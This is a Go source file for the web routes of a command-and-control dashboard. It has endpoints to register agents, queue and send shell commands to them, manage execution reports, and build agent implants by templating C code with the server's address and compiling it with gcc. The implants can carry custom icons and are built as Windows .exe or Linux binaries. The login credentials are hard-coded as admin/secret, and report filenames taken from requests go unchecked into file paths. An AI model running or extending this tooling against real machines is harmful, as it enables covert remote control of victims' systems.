package routes

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/Fir3n0x/my-c2-dashboard/cmd"
	"github.com/Fir3n0x/my-c2-dashboard/internal/handlers"
	"github.com/labstack/echo-contrib/session"

	"github.com/labstack/echo/v4"
)

// File to handle endpoint routes : front <-> back

func Register(e *echo.Echo) {
	// Default endpoint
	e.GET("/", func(c echo.Context) error {
		return c.Render(http.StatusOK, "login.html", nil)
	})

	// Login endpoint
	e.POST("/login", func(c echo.Context) error {
		username := c.FormValue("username")
		password := c.FormValue("password")

		sess, err := session.Get("session", c)
		if err != nil {
			return err
		}
		sess.Values["authenticated"] = false

		if username == "admin" && password == "secret" {
			sess.Values["authenticated"] = true
			sess.Values["username"] = username
			sess.Save(c.Request(), c.Response())
			return c.Redirect(http.StatusSeeOther, "/dashboard")
		}
		return handlers.Login(c)
	})

	// Dashboard endpoint
	e.GET("/dashboard", isAuthenticated(handlers.Dashboard))

	// Logout endpoint
	e.GET("/logout", isAuthenticated(func(c echo.Context) error {
		sess, err := session.Get("session", c)
		if err != nil {
			return err
		}

		// Remove session's values
		sess.Values["authenticated"] = false
		sess.Options.MaxAge = -1 // Immediately expire cookie
		sess.Save(c.Request(), c.Response())

		// Redirect to login page
		return c.Redirect(http.StatusSeeOther, "/")
	}))

	// LOAD LOGS
	e.GET("/api/logs", isAuthenticated(func(c echo.Context) error {
		data, err := os.ReadFile("logs.txt")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading log file: "+err.Error())
		}

		lines := cmd.SplitLines(string(data))
		total := len(lines)

		start := 0
		if total > 5000 {
			start = total - 5000
		}
		lastLines := lines[start:]

		output := []byte(cmd.JoinLines(lastLines))

		return c.Blob(http.StatusOK, "text/plain", output)
	}))

	// LOAD COMMMANDS
	e.GET("/api/commands", isAuthenticated(func(c echo.Context) error {
		data, err := os.ReadFile("commands.json")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading commands file: "+err.Error())
		}

		return c.Blob(http.StatusOK, "text/plain", data)
	}))

	// LOAD CONNECTIONS
	e.GET("/api/connections", isAuthenticated(func(c echo.Context) error {
		data, err := os.ReadFile("connections.json")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading connections file: "+err.Error())
		}
		return c.Blob(http.StatusOK, "text/plain", data)
	}))

	// Remove all agents
	e.POST("/api/flush-agents", isAuthenticated(func(c echo.Context) error {
		data, err := os.ReadFile("connections.json")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading connections file: "+err.Error())
		}

		var connections map[string]map[string]interface{}
		if err := json.Unmarshal(data, &connections); err != nil {
			return c.String(http.StatusInternalServerError, "Error parsing connections JSON: "+err.Error())
		}

		// Delete each agent via cmd.DelConnection
		for id := range connections {
			if err := cmd.DelConnection(id); err != nil {
				fmt.Printf("Error removing agent %s: %v\n", id, err)
			}
		}

		// Reset file with an empty .json file
		empty := make(map[string][]string)
		newData, err := json.MarshalIndent(empty, "", " ")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error marshalling empty JSON: "+err.Error())
		}

		if err := os.WriteFile("connections.json", newData, 0644); err != nil {
			return c.String(http.StatusInternalServerError, "Error writing file: "+err.Error())
		}

		return c.String(http.StatusOK, "All agents flushed successfully.")
	}))

	// Remove all commands
	e.POST("/api/flush-commands", isAuthenticated(func(c echo.Context) error {
		data := make(map[string][]string)

		newData, err := json.MarshalIndent(data, "", " ")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error marshalling empty JSON: "+err.Error())
		}

		if err := os.WriteFile("commands.json", newData, 0644); err != nil {
			return c.String(http.StatusInternalServerError, "Error writing file: "+err.Error())
		}

		return c.String(http.StatusOK, "All commands flushed successfully.")
	}))

	// Remove all reports
	e.POST("/api/flush-reports", isAuthenticated(func(c echo.Context) error {
		reportDir := "reports"

		entries, err := os.ReadDir(reportDir)
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading reports directory: "+err.Error())
		}

		deleted := 0
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			if strings.HasSuffix(entry.Name(), ".json") {
				path := fmt.Sprintf("%s/%s", reportDir, entry.Name())
				if err := os.Remove(path); err != nil {
					fmt.Printf("Error when removing file %s: %v\n", path, err)
					continue
				}
				deleted++
			}
		}

		return c.String(http.StatusOK, fmt.Sprintf("Flushed %d report(s) successfully.", deleted))
	}))

	// Remove all temporary generated agent files (.c file and binary file in temp directory)
	e.GET("/api/flush-agent-files", isAuthenticated(func(c echo.Context) error {
		tempDir := "temp"

		// Read all the files in the temp directory
		files, err := os.ReadDir(tempDir)
		if err != nil {
			cmd.LogInfo.Printf("[!] Failed to read temp directory: %v", err)
			return c.String(http.StatusInternalServerError, "Failed to read temp directory")
		}

		// Remove each file
		var deleted []string
		for _, file := range files {
			path := filepath.Join(tempDir, file.Name())
			err := os.Remove(path)
			if err != nil {
				cmd.LogInfo.Printf("[!] Failed to delete file %s: %v", path, err)
				continue
			}
			deleted = append(deleted, file.Name())
		}

		// Log and response
		cmd.LogInfo.Printf("[+] Flushed %d files from temp directory", len(deleted))
		return c.JSON(http.StatusOK, map[string]any{
			"status":  "success",
			"deleted": deleted,
			"count":   len(deleted),
		})
	}))

	// Remove a report regarding a given id
	e.POST("/api/del-report", isAuthenticated(func(c echo.Context) error {
		id := c.FormValue("id")
		if id == "" {
			return c.String(http.StatusBadRequest, "Missing report ID")
		}

		reportDir := "reports"
		filename := fmt.Sprintf("%s/%s.json", reportDir, id)

		// Check if file already exists
		if _, err := os.Stat(filename); os.IsNotExist(err) {
			return c.String(http.StatusNotFound, fmt.Sprintf("Report '%s' not found", id))
		} else if err != nil {
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Error accessing report '%s': %v", id, err))
		}

		// Delete the file
		if err := os.Remove(filename); err != nil {
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Error deleting report '%s': %v", id, err))
		}

		return c.String(http.StatusOK, fmt.Sprintf("Report '%s' deleted successfully", id))
	}))

	// Remove a command
	e.POST("/api/del-command", isAuthenticated(func(c echo.Context) error {
		id := c.FormValue("id")
		cmd_val := c.FormValue("cmd")
		index, _ := strconv.Atoi(c.FormValue("index"))

		data, err := os.ReadFile("commands.json")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading commands file: "+err.Error())
		}

		// Parse the commands JSON
		var all map[string][]string
		if err := json.Unmarshal(data, &all); err != nil {
			return c.String(http.StatusInternalServerError, "Error parsing commands JSON: "+err.Error())
		}

		// Filter commands
		commands, exists := all[id]
		if !exists {
			return c.String(http.StatusBadRequest, "No commands found for this ID")
		}

		newList := []string{}
		for i, command := range commands {
			fmt.Printf("index: %d, i: %d\n", index, i)
			if index == i {
				continue
			}
			newList = append(newList, command)

		}

		all[id] = newList

		newData, err := json.MarshalIndent(all, "", " ")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error marshalling JSON: "+err.Error())
		}
		if err := os.WriteFile("commands.json", newData, 0644); err != nil {
			return c.String(http.StatusInternalServerError, "Error writing file: "+err.Error())
		}

		return c.String(http.StatusOK, fmt.Sprintf("Command '%s' deleted for ID '%s'", cmd_val, id))

	}))

	// Remove one agent regarding a given id
	e.POST("/api/del-connection", isAuthenticated(func(c echo.Context) error {
		id := c.FormValue("id")

		err := cmd.DelConnection(id)
		if err != nil {
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Error when deleting connection '%s': %v", id, err))
		}
		return c.String(http.StatusOK, fmt.Sprintf("Connection '%s' successfully deleted", id))
	}))

	// Shut down connection (Reachable -> false)
	e.POST("/api/shut-down-connection", isAuthenticated(func(c echo.Context) error {
		id := c.FormValue("id")

		err := cmd.ShutDownConnection(id)
		if err != nil {
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Error when shutting down connection '%s': %v", id, err))
		}

		return c.String(http.StatusOK, fmt.Sprintf("Connection '%s' successfully shut down", id))
	}))

	// Remove one execution command in a report
	e.POST("/api/del-command-execution-report", isAuthenticated(func(c echo.Context) error {
		Filename := c.FormValue("filename")
		Timestamp := c.FormValue("IDtimestamp")

		path := fmt.Sprintf("reports/%s", Filename)
		data, err := os.ReadFile(path)
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error reading report file: "+err.Error())
		}

		var reports []cmd.CommandReport
		if err := json.Unmarshal(data, &reports); err != nil {
			return c.String(http.StatusInternalServerError, "Error parsing report JSON: "+err.Error())
		}

		// Filter reports
		newReports := []cmd.CommandReport{}
		for _, r := range reports {
			if r.Timestamp != Timestamp {
				newReports = append(newReports, r)
			}
		}

		updated, err := json.MarshalIndent(newReports, "", "  ")
		if err != nil {
			return c.String(http.StatusInternalServerError, "Error marshalling JSON: "+err.Error())
		}

		if err := os.WriteFile(path, updated, 0644); err != nil {
			return c.String(http.StatusInternalServerError, "Error writing file: "+err.Error())
		}

		return c.String(http.StatusOK, "Execution deleted")
	}))

	// Send a command to an agent
	e.POST("/api/send-command", isAuthenticated(func(c echo.Context) error {
		id := c.FormValue("id")
		command := c.FormValue("cmd")

		err := cmd.SendCommand(id, command)
		if err != nil {
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Error when sending command '%s' to %s: %v", command, id, err))
		}
		return c.String(http.StatusOK, fmt.Sprintf("Command '%s' successfully sent to %s", command, id))
	}))

	// Send a command from the terminal to an agent (shell part)
	e.POST("/api/send-terminal-command", isAuthenticated(func(c echo.Context) error {
		id := c.FormValue("id")
		command := c.FormValue("cmd")

		err := cmd.SendCommand(id, command)
		if err != nil {
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Error when sending command '%s' to %s: %v", command, id, err))
		}
		return c.String(http.StatusOK, fmt.Sprintf("Command '%s' successfully sent to %s", command, id))
	}))

	// Store a new command in the commands.json file regarding a given id
	e.POST("/api/update-commands", isAuthenticated(func(c echo.Context) error {
		var payload struct {
			ID       string   `json:"id"`
			Commands []string `json:"commands"`
		}

		if err := c.Bind(&payload); err != nil {
			return c.String(http.StatusBadRequest, "Invalid payload")
		}

		data, err := os.ReadFile("commands.json")
		if err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}

		var all map[string][]string
		if err := json.Unmarshal(data, &all); err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}

		all[payload.ID] = payload.Commands
		// Update the command store
		if _, exists := cmd.MyCommandStore.Commands[payload.ID]; !exists {
			cmd.MyCommandStore.Commands[payload.ID] = make([]string, 0)
		}
		cmd.MyCommandStore.Commands[payload.ID] = payload.Commands
		fmt.Printf("\nUpdated commands for ID %s: %v\n", payload.ID, cmd.MyCommandStore.Commands[payload.ID])

		newData, err := json.MarshalIndent(all, "", " ")
		if err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}

		if err := os.WriteFile("commands.json", newData, 0644); err != nil {
			return c.String(http.StatusInternalServerError, err.Error())
		}

		return c.String(http.StatusOK, "Command order updated")
	}))

	// Submit a new agent
	e.POST("/api/submit-agent", isAuthenticated(func(c echo.Context) error {
		var payload struct {
			Name    string `json:"name"`
			ID      string `json:"id"`
			OS      string `json:"os"`
			Type    string `json:"type"`
			Icon    string `json:"icon"`
			DstPort string `json:"dstport"`
		}
		if err := c.Bind(&payload); err != nil {
			return c.String(http.StatusBadRequest, "Invalid payload")
		}

		client := &cmd.Client{
			Name:          payload.Name,
			ID:            payload.ID,
			IP:            "—",
			OS:            payload.OS,
			SrcPort:       "—",
			DstPort:       payload.DstPort,
			LastConnexion: "Not Yet",
			TYPE:          payload.Type,
			ConnServer:    nil,
			ConnProxy:     nil,
			Icon:          payload.Icon,
			Reachable:     false,
		}

		if err := cmd.MyClientStore.AddClient(*client); err != nil {
			cmd.LogInfo.Printf("[!] Failed to persist client %s: %v", payload.ID, err)
			return c.String(http.StatusInternalServerError, err.Error())
		}

		cmd.ClientsMu.Lock()
		cmd.Clients[payload.ID] = client
		cmd.ClientsMu.Unlock()

		cmd.PingWebSocket("connection_update", "")
		cmd.LogInfo.Printf("[+] Client %s (%s) added successfully", payload.Name, payload.ID)

		return c.String(http.StatusOK, "Agent successfully submitted")

	}))

	// Create an agent
	e.POST("/api/build-agent", isAuthenticated(func(c echo.Context) error {
		var payload struct {
			Name    string `json:"name"`
			ID      string `json:"id"`
			OS      string `json:"os"`
			Type    string `json:"type"`
			Icon    string `json:"icon"`
			DstPort string `json:"dstport"`
		}
		if err := c.Bind(&payload); err != nil {
			return c.String(http.StatusBadRequest, "Invalid payload")
		}

		// Set extension to build the agent
		var extension string
		switch payload.OS {
		case "windows":
			extension = ".exe"
		case "linux":
			extension = ".bin"
		default:
			extension = ".out"
		}

		fmt.Printf("Extension : %s\n", extension)

		// fmt.Printf("\nType: %s, Extension: %s\n", payload.Type, payload.Extension)

		codeBytes, err := handlers.GenerateAgentSource(handlers.AgentConfig{
			ID:          payload.ID,
			IP_SERVER:   cmd.IPServer,
			PORT_SERVER: payload.DstPort,
			TYPE:        payload.Type,
			OS:          payload.OS,
		})
		if err != nil {
			return c.String(http.StatusInternalServerError, "Template generation failed")
		}
		// fmt.Println("Generated C code:\n", string(codeBytes))

		// Write temporary file
		sourcePath := fmt.Sprintf("temp/%s.c", payload.Name)
		exePath := fmt.Sprintf("temp/%s%s", payload.Name, extension)
		iconPath := fmt.Sprintf("static/img/icon/%s.res", payload.Icon)

		if err := os.MkdirAll("temp", os.ModePerm); err != nil {
			fmt.Println("Failed to create temp directory:", err)
			return c.String(http.StatusInternalServerError, "Failed to create temp directory")
		}

		if err := os.WriteFile(sourcePath, codeBytes, 0644); err != nil {
			fmt.Println("Write file issue")
			return c.String(http.StatusInternalServerError, "Error writing source file")
		}

		args := handlers.GetBuildConfig(payload.OS, payload.Type, payload.Icon, sourcePath, exePath, iconPath)
		command := exec.Command("gcc", args...)
		fmt.Printf("Command output: %s\n", command)

		output, err := command.CombinedOutput()

		if err != nil {
			fmt.Println("Compilation failed:", err)
			fmt.Println("GCC output:\n", string(output))
			return c.String(http.StatusInternalServerError, fmt.Sprintf("Compilation failed:\n%s", string(output)))
		}

		// Send compiled file
		return c.Attachment(exePath, fmt.Sprintf("%s%s", payload.ID, extension))
	}))

	// Save a new command template preset in the backend
	e.POST("/api/save-new-command-template-preset", isAuthenticated(func(c echo.Context) error {
		var payload struct {
			Name string `json:"name"`
			Commands []string `json:"commands"`
		}
		
		if err := c.Bind(&payload); err != nil {
			return c.JSON(http.StatusBadRequest, map[string]string{"error": "Invalid payload"})
		}

		// Add preset to the store
		err := cmd.MyPresetCommandStore.AddPreset(payload.Name, payload.Commands)
		if err != nil {
			fmt.Println("AddPreset error:", err)
			return c.JSON(http.StatusInternalServerError, map[string]string{"error": "Failed to save preset: " + err.Error()})
		}

		return c.JSON(http.StatusOK, map[string]string{"status": "Preset saved successfully"})
	}))

	// Retrieve all command template presets
	e.GET("/api/command-template-presets", isAuthenticated(func(c echo.Context) error {
		data, err := os.ReadFile(cmd.MyPresetCommandStore.File)
		if err != nil {
			if os.IsNotExist(err) {
				// If file does not exist, return empty map
				return c.JSON(http.StatusOK, map[string][]string{})
			}
			return c.String(http.StatusInternalServerError, "Error reading preset commands file: "+err.Error())
		}

		var presets map[string][]string
		if err := json.Unmarshal(data, &presets); err != nil {
			return c.String(http.StatusInternalServerError, "Error parsing preset commands JSON: "+err.Error())
		}

		return c.JSON(http.StatusOK, presets)
	}))

	// Delete a preset from the store
	e.DELETE("/api/delete-preset/:name", isAuthenticated(func(c echo.Context) error {
		presetName := c.Param("name")
		cmd.MyPresetCommandStore.DeletePresetCommand(presetName)
		return c.JSON(http.StatusOK, map[string]string{"status": "Preset deleted"})
	}))

	// Retrieve the content of an execution file report
	e.GET("/api/report", isAuthenticated(handlers.GetReportHandler))

	// Retrieve all execution files report
	e.GET("/api/reports-list", isAuthenticated(handlers.GetReportsListHandler))

}

// Check if the current user is authenticated -> mandatory to access other endpoints
func isAuthenticated(next echo.HandlerFunc) echo.HandlerFunc {
	return func(c echo.Context) error {
		sess, _ := session.Get("session", c)
		auth, ok := sess.Values["authenticated"].(bool)
		// fmt.Println("Session auth:", auth, "ok:", ok)
		if !ok || !auth {
			return c.Redirect(http.StatusSeeOther, "/")
		}
		return next(c)
	}
}
